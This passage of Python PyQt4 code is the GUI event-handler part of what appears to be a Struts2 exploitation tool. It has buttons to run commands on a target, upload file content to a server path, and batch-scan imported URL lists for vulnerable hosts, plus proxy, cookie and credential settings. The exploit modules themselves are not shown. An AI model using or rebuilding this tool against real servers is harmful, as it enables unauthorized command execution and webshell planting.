    def on_pushButton_cmd_clicked(self,event):
        if self.curmod:
            self.text_cmd.setText(self.curmod.exp(self.lineEdit_cmd.text()))
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allload_clicked(self,event):
        folder = QtGui.QFileDialog.getOpenFileName(None,u"选择导入的地址文件",'',"*.*")
        if folder:
           self.treeWidget.clear()
           inFile = QtCore.QFile(folder)
           if inFile.open(QtCore.QIODevice.ReadOnly):
              stream = QtCore.QTextStream(inFile)
              i = 1
              while not stream.atEnd():
                  line = stream.readLine()
                  item = QtGui.QTreeWidgetItem()
                  item.setText(0,str(i))
                  item.setText(1,_fromUtf8(line))
                  item.setText(2,_fromUtf8(u'待验证'))
                  self.treeWidget.addTopLevelItem(item)
                  i += 1
           self.lineEdit_all.setText(folder)
           self.updatestatus(u'文件导入成功')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_alltest_clicked(self,event):
        item = QtGui.QTreeWidgetItemIterator(self.treeWidget)
        items = []
        while item.value():
            items.append(item.value())
            item = item.__iadd__(1)
        #多线程
        self.allverify.setup(Queue = items,handler=self.allverify_event)
        self.allverify.start()
        self.updatestatus(u'开始批量验证')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allstop_clicked(self,event):
        self.allverify.stop()
        self.updatestatus(u'停止批量验证')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allexport_clicked(self,event):
        item = QtGui.QTreeWidgetItemIterator(self.treeWidget)
        csv = []
        while item.value():
            csv.append(','.join([item.value().text(0),item.value().text(1),item.value().text(2)]))
            item = item.__iadd__(1)
        filename = QtGui.QFileDialog.getSaveFileName(None,u"保存文件",'',"*.csv")
        if filename:
            with open(filename,'w') as f:
                f.write('\n'.join(csv))
                f.close()
            self.updatestatus(u'文件导出成功。%s'%filename)

    @QtCore.pyqtSlot(QtGui.QTreeWidgetItem,int)
    def on_treeWidget_itemDoubleClicked(self,item,i):
        url = str(item.text(1)).strip()
        self.lineEdit_url.setText(url)
        StrutsBase.url = url
        self.updatestatus(u'选择URL地址%s'%url)

    @QtCore.pyqtSlot(bool)
    def on_pushButton_getpath_clicked(self,event):
        if self.curmod:
            self.lineEdit_upload.setText(self.curmod.getpath())
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_upload_clicked(self,event):
        if self.curmod:
            path = self.lineEdit_upload.text()
            path = str(path).strip().replace('\\','/')
            content = self.text_upload.toPlainText()
            if self.curmod.upload(path,content):
                self.updatestatus(u'上传成功')
            else:
                self.updatestatus(u'上传失败')
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')
    @QtCore.pyqtSlot(str)
    def on_comboBox_mod_activated(self,event):
        if event in self.mods.keys():
            self.curmod = self.mods[str(event)]
            self.updatestatus(u'手动切换为%s漏洞模式'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_proxyhost_textChanged(self,event):
        host = self.lineEdit_proxyhost.text()
        port = self.lineEdit_proxyport.text()
        StrutsBase.proxies = {'http':'http://%s:%s'%(host,port),'https':'http://%s:%s'%(host,port)}
        self.updatestatus(u'更改代理地址为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_proxyport_textChanged(self,event):
        host = self.lineEdit_proxyhost.text()
        port = self.lineEdit_proxyport.text()
        StrutsBase.proxies = {'http':'http://%s:%s'%(host,port),'https':'http://%s:%s'%(host,port)}
        self.updatestatus(u'更改代理端口为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_authname_textChanged(self,event):
        name = self.lineEdit_authname.text()
        pwd = self.lineEdit_authpwd.text()
        StrutsBase.auth = (name,pwd)
        self.updatestatus(u'更改认证用户为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_authpwd_textChanged(self,event):
        name = self.lineEdit_authname.text()
        pwd = self.lineEdit_authpwd.text()
        StrutsBase.auth = (name,pwd)
        self.updatestatus(u'更改认证密码为%s'%event)

    @QtCore.pyqtSlot()
    def on_plainTextEdit_cookie_textChanged(self):
        event = self.plainTextEdit_cookie.toPlainText()
        StrutsBase.set_header('Cookie',event)
        self.updatestatus(u'更改COOKIE为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_ua_textChanged(self,event):
        StrutsBase.set_header('User-Agent',event)
        self.updatestatus(u'更改UA头为%s'%event)

    @QtCore.pyqtSlot(int)
    def on_spinBox_threads_valueChanged(self,event):
        self.allverify.setup(threads=event)
        self.updatestatus(u'更改线程数为%s'%event)

class GuiMain(EventHandler):
    signal_status = QtCore.pyqtSignal(str)
    def __init__(self):
        super(EventHandler, self).__init__()
        self.setupUi(self)
        self.treeWidget.header().setResizeMode(QtGui.QHeaderView.ResizeToContents)
        #禁止最大化
        self.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint)
        #禁止拉伸窗口
        self.setFixedSize(self.width(), self.height())

        self.signal_status.connect(self.updatestatus)
        self.mods = {}
        self.curmod = None
        for i,mod in enumerate(StrutsBase.__subclasses__()):
            self.mods[mod.__name__] = mod()
            self.comboBox_mod.addItem(_fromUtf8(mod.__name__))
        self.allverify = QIterThread()
        #QtCore.QMetaObject.connectSlotsByName(self)

    def updatestatus(self,msg):
        self.statusBar.showMessage(msg)

    def allverify_event(self,item):
        try:
           url = item.text(1)
           item.setText(2,_fromUtf8(u'未发现漏洞'))
           for name,mod in self.mods.items():
               if mod.poc(url=str(url).strip()):
                  item.setText(2,'%s'%name)
                  item.setBackgroundColor(0,QtGui.QColor("#ff0000"))
                  item.setBackgroundColor(1,QtGui.QColor("#ff0000"))
                  item.setBackgroundColor(2,QtGui.QColor("#ff0000"))
        except Exception as e:
            self.updatestatus(str(e))

def main():
   app = QtGui.QApplication(sys.argv)
   mainWindow = GuiMain()
   mainWindow.show()
   sys.exit(app.exec_())
main()
